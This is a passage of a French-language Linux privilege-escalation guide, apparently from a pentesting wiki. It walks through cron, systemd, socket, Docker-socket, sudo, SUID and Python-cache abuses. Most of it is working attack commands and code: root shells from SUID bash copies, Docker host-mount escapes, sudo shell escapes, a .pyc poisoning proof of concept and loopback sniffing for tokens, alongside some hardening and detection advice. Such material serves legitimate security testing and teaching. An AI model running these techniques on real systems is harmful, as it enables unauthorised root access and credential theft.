# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu’il est exécuté par root, les fichiers de destination héritent de la **propriété root + des SUID/SGID choisis par l’attaquant**. Toute routine de sauvegarde/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer une tâche cron **en plaçant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Pour détecter ce type d’entrée furtive, inspectez les fichiers cron à l’aide d’outils qui affichent les caractères de contrôle :

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Services

### Fichiers _.service_ accessibles en écriture

Vérifiez si vous pouvez écrire dans un fichier `.service`. Si c’est le cas, vous **pourriez le modifier** afin qu’il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre le redémarrage de la machine).\
Par exemple, créez votre backdoor dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service accessibles en écriture

N’oubliez pas que si vous avez des **permissions en écriture sur des binaires exécutés par des services**, vous pouvez les remplacer par des backdoors, qui seront exécutées lors du prochain redémarrage des services.

### PATH de systemd - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec :

```bash
systemctl show-environment
```

Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être **élever vos privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services**, tels que :

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ensuite, créez un **exécutable** portant le **même nom que le binaire au chemin relatif** dans le dossier PATH de systemd où vous pouvez écrire. Lorsque le service doit exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer ou arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers d’unité systemd dont le nom se termine par `**.timer**` et qui contrôlent les fichiers `**.service**` ou des événements. Les **Timers** peuvent remplacer cron, car ils prennent en charge les événements temporels calendaires et monotones, et peuvent s’exécuter de manière asynchrone.

Vous pouvez énumérer tous les timers avec :

```bash
systemctl list-timers --all
```

### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez lui faire exécuter certaines unités systemd.unit (comme un `.service` ou un `.target`).

```bash
Unit=backdoor.service
```

Dans la documentation, vous pouvez lire ce qu’est l’unité :

> L’unité à activer lorsque ce timer expire. L’argument est le nom d’une unité, sans le suffixe « .timer ». Si cette valeur n’est pas spécifiée, elle correspond par défaut à un service portant le même nom que l’unité du timer, à l’exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l’unité activée et celui de l’unité du timer soient identiques, à l’exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devez :

- Trouver une unité systemd (comme un `.service`) qui **exécute un binaire sur lequel vous avez des droits d’écriture**
- Trouver une unité systemd qui **exécute un chemin relatif** et sur lequel vous avez des **droits d’écriture dans le PATH de systemd** (pour usurper l’identité de cet exécutable)

**Pour en savoir plus sur les timers, consultez `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer, vous avez besoin des privilèges root et devez exécuter :

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur une même machine ou entre différentes machines selon le modèle client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication entre ordinateurs et sont configurés à l’aide de fichiers `.socket`.<sup>[[14]](#references)</sup>

Les sockets peuvent être configurés à l’aide de fichiers `.socket`.

**Pour en savoir plus sur les sockets, consultez `man systemd.socket`.** Plusieurs paramètres intéressants peuvent être configurés dans ce fichier :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : ces options sont différentes, mais elles servent toutes à **indiquer où le socket va écouter** (le chemin du fichier socket AF_UNIX, l’adresse IPv4/6 et/ou le numéro de port à écouter, etc.).
- `Accept` : accepte un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion lui est transmis. Si **false**, tous les sockets d’écoute sont **transmis à l’unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs, où une seule unité de service gère systématiquement tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performances, il est recommandé de n’écrire de nouveaux daemons que de manière à ce qu’ils soient compatibles avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : accepte une ou plusieurs lignes de commande, **exécutées avant** ou **après** la **création** et la liaison des **sockets**/FIFOs d’écoute, respectivement. Le premier élément de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost` : commandes supplémentaires **exécutées avant** ou **après** la **fermeture** et la suppression des **sockets**/FIFOs d’écoute, respectivement.
- `Service` : indique le nom de l’unité de **service à activer** lors de la réception de **trafic entrant**. Ce paramètre est autorisé uniquement pour les sockets avec `Accept=no`. Par défaut, il s’agit du service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d’utiliser cette option.

### Fichiers .socket accessibles en écriture

Si vous trouvez un fichier `.socket` **accessible en écriture**, vous pouvez **ajouter** au début de la section `[Socket]` une ligne telle que : `ExecStartPre=/home/kali/sys/backdoor`, et la backdoor sera exécutée avant la création du socket. Vous devrez donc **probablement attendre le redémarrage de la machine.**\
_Notez que le système doit utiliser la configuration de ce fichier socket, sinon la backdoor ne sera pas exécutée_

### Activation de socket + chemin d’unité accessible en écriture (créer le service manquant)

Une autre mauvaise configuration à fort impact est la suivante :

- une unité socket avec `Accept=no` et `Service=<name>.service`
- l’unité de service référencée est manquante
- un attaquant peut écrire dans `/etc/systemd/system` (ou dans un autre chemin de recherche d’unités)

Dans ce cas, l’attaquant peut créer `<name>.service`, puis envoyer du trafic au socket afin que systemd charge et exécute le nouveau service en tant que root.

Étapes rapides :

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets accessibles en écriture

Si vous **identifiez un socket accessible en écriture** (_nous parlons ici de sockets Unix, et non des fichiers de configuration `.socket`_), vous pouvez **communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les sockets Unix

```bash
netstat -a -p --unix
```

### Connexion brute

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exemple d’exploitation :**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Notez qu’il peut y avoir des **sockets en écoute de requêtes HTTP** (_je ne parle pas des fichiers .socket, mais des fichiers qui agissent comme des sockets Unix_). Vous pouvez vérifier cela avec :

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Si le socket **répond à une requête HTTP**, vous pouvez alors **communiquer** avec lui et peut-être **exploiter une vulnérabilité**.

### Socket Docker accessible en écriture

Le socket Docker, souvent situé dans `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l’utilisateur `root` et les membres du groupe `docker`. L’accès en écriture à ce socket peut entraîner une élévation de privilèges. Voici comment procéder, ainsi que d’autres méthodes si Docker CLI n’est pas disponible.

#### **Élévation de privilèges avec Docker CLI**

Si vous avez accès en écriture au socket Docker, vous pouvez élever vos privilèges à l’aide des commandes suivantes :<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ces commandes vous permettent d’exécuter un conteneur avec un accès root au système de fichiers de l’hôte.

#### **Utilisation directe de l’API Docker**

Lorsque la CLI Docker n’est pas disponible, le socket Docker peut tout de même être exploité à l’aide de requêtes HTTP brutes sur le socket Unix. La méthode la plus fiable consiste à :

- créer un conteneur auxiliaire de longue durée avec la racine de l’hôte montée en bind
- le démarrer
- créer une instance `exec` dans ce conteneur auxiliaire
- démarrer l’instance `exec` et récupérer la sortie via l’API

**Lister les images Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Créer et démarrer un conteneur auxiliaire**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Créer une instance exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Démarrez l’instance exec et lisez la sortie**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ce modèle est généralement plus robuste que d’essayer de piloter manuellement `attach` avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances `exec` supplémentaires pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH sous `/host/root/.ssh` ou modifier les fichiers de démarrage de l’hôte.

### Autres

Notez que si vous avez des permissions d’écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**davantage de moyens d’élever vos privilèges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si [**l’API Docker écoute sur un port**, vous pouvez également la compromettre](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **d’autres moyens de sortir de conteneurs ou d’exploiter des runtimes de conteneurs pour élever vos privilèges** dans :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Élévation de privilèges avec Containerd (ctr)

Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante : **vous pourriez pouvoir l’exploiter pour élever vos privilèges**.


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Élévation de privilèges avec **RunC**

Si vous découvrez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante : **vous pourriez pouvoir l’exploiter pour élever vos privilèges**.


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d’interagir et de partager des données efficacement. Conçu pour les systèmes Linux modernes, il offre un framework robuste pour différentes formes de communication entre applications.<sup>[[16]](#references)</sup>

Ce système polyvalent prend en charge les communications IPC de base, qui améliorent l’échange de données entre les processus, à l’image des **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, facilitant l’intégration transparente des composants du système. Par exemple, un signal d’un daemon Bluetooth indiquant un appel entrant peut inciter un lecteur de musique à couper le son, améliorant ainsi l’expérience utilisateur. De plus, D-Bus prend en charge un système d’objets distants, qui simplifie les requêtes de services et les appels de méthodes entre applications, rationalisant ainsi des processus traditionnellement complexes.

D-Bus fonctionne selon un **modèle d’autorisation et de refus**, qui gère les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l’effet cumulé des règles de stratégie correspondantes. Ces stratégies définissent les interactions avec le bus et peuvent potentiellement permettre une élévation de privilèges par l’exploitation de ces permissions.

Voici un exemple de stratégie dans `/etc/dbus-1/system.d/wpa_supplicant.conf`, qui détaille les permissions permettant à l’utilisateur root de posséder `fi.w1.wpa_supplicant1`, de lui envoyer des messages et d’en recevoir.

Les stratégies sans utilisateur ni groupe spécifié s’appliquent à tous, tandis que les stratégies de contexte « default » s’appliquent à tout ce qui n’est pas couvert par d’autres stratégies spécifiques.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Apprenez ici à énumérer et à exploiter une communication D-Bus :**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d’énumérer le réseau et de déterminer la position de la machine.

### Énumération générique

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Si une entrée active de `/etc/inetd.conf` exécute GNU Inetutils `telnetd` en tant que root, vérifiez la version du binaire configuré et le listener local, même si le port est lié uniquement à loopback. GNU Inetutils 1.9.3 à 2.7 était affecté par un [contournement de l’authentification Telnet](https://seclists.org/oss-sec/2026/q1/89) : la valeur `USER` fournie par le client était transmise à `login -f` (CVE-2026-24061). Un processus ou une chaîne de version est un indicateur ; confirmez la présence d’un correctif du fournisseur et vérifiez le daemon réellement utilisé avant de considérer le système comme exposé. Le [guide Telnet](../../../network-services-pentesting/pentesting-telnet.md) fournit plus de détails.

### Triage rapide du filtrage sortant

Si l’hôte peut exécuter des commandes, mais que les callbacks échouent, distinguez rapidement le filtrage DNS, transport, proxy et routage :

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Ports ouverts

Vérifiez toujours les services réseau en cours d’exécution sur la machine avec lesquels vous n’avez pas pu interagir avant d’y accéder :

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classifiez les listeners selon leur cible de bind :

- `0.0.0.0` / `[::]` : exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1` : accessibles uniquement en local (bons candidats pour un tunnel/forward).
- Adresses IP internes spécifiques (p. ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis les segments internes.

### Workflow de triage des services accessibles uniquement en local

Lorsque vous compromettez un host, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Voici un workflow local rapide :

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des vérifications locales d’élévation de privilèges, linPEAS peut fonctionner comme scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un pur scanner réseau (en ignorant le reste des vérifications d’élévation de privilèges).

### Sniffing

Vérifiez si vous pouvez sniffer le trafic. Si c’est le cas, vous pourriez récupérer des identifiants.

```
timeout 1 tcpdump
```

Vérifications pratiques rapides :

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) est particulièrement précieux en post-exploitation, car de nombreux services réservés à un usage interne y exposent des tokens/cookies/identifiants :

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Capturez maintenant, analysez plus tard :

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents sur le système, lesquels peuvent **login** et lesquels ont des **privilèges root** :

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID élevé

Certaines versions de Linux étaient affectées par un bug permettant aux utilisateurs avec un **UID > INT_MAX** d’élever leurs privilèges. Plus d’informations : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploitez-le** avec : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d’un groupe** susceptible de vous accorder des privilèges root :


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si le presse-papiers contient des éléments intéressants (si possible)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Politique de mots de passe

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Mots de passe connus

Si vous **connaissez un mot de passe** de l’environnement, **essayez de vous connecter en tant que chaque utilisateur** avec ce mot de passe.

### Su Brute

Si vous ne craignez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l’ordinateur, vous pouvez essayer de brute-forcer les utilisateurs avec [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) essaie également de brute-forcer les utilisateurs avec le paramètre `-a`.

## Abus liés à un PATH accessible en écriture

### $PATH

Si vous constatez que vous pouvez **écrire dans un dossier du $PATH**, vous pourrez peut-être escalader vos privilèges en **créant une backdoor dans le dossier accessible en écriture**, portant le nom d’une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n’est pas chargée depuis un dossier situé avant votre dossier accessible en écriture dans le $PATH**.

### SUDO et SUID

Il se peut que vous soyez autorisé à exécuter certaines commandes avec sudo, ou que leur bit suid soit défini. Vérifiez-le avec :

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Certaines **commandes inattendues permettent de lire et/ou d’écrire des fichiers, voire d’exécuter une commande**.<sup>[[8]](#references)</sup> Par exemple :

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configuration de sudo peut permettre à un utilisateur d’exécuter certaines commandes avec les privilèges d’un autre utilisateur sans connaître le mot de passe.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Dans cet exemple, l’utilisateur `demo` peut exécuter `vim` en tant que `root`. Il est alors trivial d’obtenir un shell en ajoutant une clé SSH au répertoire root ou en appelant `sh`.

```
sudo vim -c '!sh'
```

### Comparaison Bash non citée dans un script sudo

Dans Bash, le membre de droite de `[[ "$protected" == $candidate ]]` est un motif. Si un script sudo pouvant s’exécuter en tant que root renseigne `candidate` à partir d’un fichier contrôlé par l’appelant, une valeur telle que `prefix*` peut correspondre au début d’une chaîne protégée. Des chemins de succès et d’erreur différents peuvent alors révéler un prefix oracle. Mettez le membre de droite entre guillemets (`[[ "$protected" == "$candidate" ]]`) lorsque l’égalité littérale est voulue. Avant de considérer qu’une comparaison sans guillemets est exploitable, examinez les arguments sudo effectifs, la provenance des entrées et le comportement observable des branches. Le [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) définit ce comportement des motifs.

### Fichiers de projet PrusaSlicer exécutés avec sudo

Une autorisation sudo sans restriction permettant d’exécuter `prusaslicer` ou `prusa-slicer` en tant que root mérite d’être examinée si l’appelant peut choisir le projet `.3mf` à trancher. Un projet peut contenir un script de post-traitement qui s’exécute lors de l’exportation du G-code ; des projets conçus à cet effet pourraient exécuter des commandes dans PrusaSlicer jusqu’à la version 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Avant de conclure que la frontière de privilèges peut être franchie, vérifiez la règle sudo effective, la version du binaire et les correctifs du fournisseur, la provenance du projet et si le chemin d’exportation concerné est emprunté. Un argument de projet fixe ou une règle `NOEXEC` effective peut changer le résultat. La simple présence du slicer ne suffit pas à établir un chemin d’escalade de privilèges.

### SETENV

Cette directive permet à l’utilisateur de **définir une variable d’environnement** lors de l’exécution d’une commande :

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking**, qui permettait de charger une bibliothèque Python arbitraire lors de l’exécution du script en tant que root :

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Empoisonnement de `__pycache__` / `.pyc` inscriptible dans les imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire de package contient un **`__pycache__` inscriptible**, vous pouvez peut-être remplacer le `.pyc` mis en cache et obtenir l’exécution de code en tant qu’utilisateur privilégié lors du prochain import.<sup>[[30]](#references)</sup>

- Pourquoi ça fonctionne :
  - CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - L’interpréteur valide l’**en-tête** (magic + métadonnées d’horodatage/hash liées à la source), puis exécute l’objet code marshalé stocké après cet en-tête.
  - Si vous pouvez **supprimer et recréer** le fichier mis en cache parce que le répertoire est inscriptible, un `.pyc` appartenant à root mais non inscriptible peut tout de même être remplacé.
- Parcours typique :
  - `sudo -l` affiche un script ou wrapper Python que vous pouvez exécuter en tant que root.
  - Ce script importe un module local depuis `/opt/app/`, `/usr/local/lib/...`, etc.
  - Le répertoire `__pycache__` du module importé est inscriptible par votre utilisateur ou par tout le monde.

Énumération rapide :

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Si vous pouvez examiner le script privilégié, identifiez les modules importés et leur chemin de cache :<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Workflow d’exploitation :

1. Exécutez une fois le script autorisé via sudo afin que Python crée le fichier cache légitime s’il n’existe pas déjà.
2. Lisez les 16 premiers octets du fichier `.pyc` légitime et réutilisez-les dans le fichier empoisonné.
3. Compilez un objet code contenant un payload, sérialisez-le avec `marshal.dumps(...)`, supprimez le fichier cache d’origine, puis recréez-le avec l’en-tête d’origine suivi de votre bytecode malveillant.
4. Réexécutez le script autorisé via sudo afin que l’import exécute votre payload en tant que root.

Remarques importantes :

- Réutiliser l’en-tête d’origine est essentiel, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement au code source.
- C’est particulièrement utile lorsque le fichier source appartient à root et n’est pas modifiable, mais que le répertoire `__pycache__` qui le contient l’est.
- `PYTHONDONTWRITEBYTECODE=1` et `python -B` empêchent Python d’écrire de nouveaux fichiers `.pyc` ; ils ne l’empêchent **pas** de charger un cache déjà valide et remplacé par un attaquant. Le point essentiel est de savoir si un utilisateur moins privilégié peut remplacer un cache que l’import privilégié acceptera. Python vérifie les métadonnées d’horodatage et de taille, ou de hachage, avant de charger le bytecode mis en cache. Consultez la [référence sur les imports Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) et la [documentation de la ligne de commande](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Forme minimale de preuve de concept :

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Durcissement :

- Assurez-vous qu’aucun répertoire du chemin d’importation Python privilégié n’est accessible en écriture aux utilisateurs à faibles privilèges, y compris `__pycache__`.
- Auditez la propriété et les permissions des répertoires de cache, ainsi que celles des fichiers `.pyc` existants. Désactiver l’écriture du bytecode peut réduire la création de nouveaux caches, mais ne neutralise pas un cache existant qui peut être remplacé.
- Traitez les modules Python locaux et les répertoires de cache accessibles en écriture comme des scripts shell ou des bibliothèques partagées accessibles en écriture et exécutés par root.

### BASH_ENV préservé via sudo env_keep → shell root

Si sudoers préserve `BASH_ENV` (p. ex., `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l’appel d’une commande autorisée.<sup>[[24]](#references)</sup>

- Pourquoi cela fonctionne : dans un shell non interactif, Bash évalue `$BASH_ENV` et source le fichier avant d’exécuter le script cible. De nombreuses règles sudo autorisent l’exécution d’un script ou d’un wrapper shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.<sup>[[23]](#references)</sup>

- Prérequis :
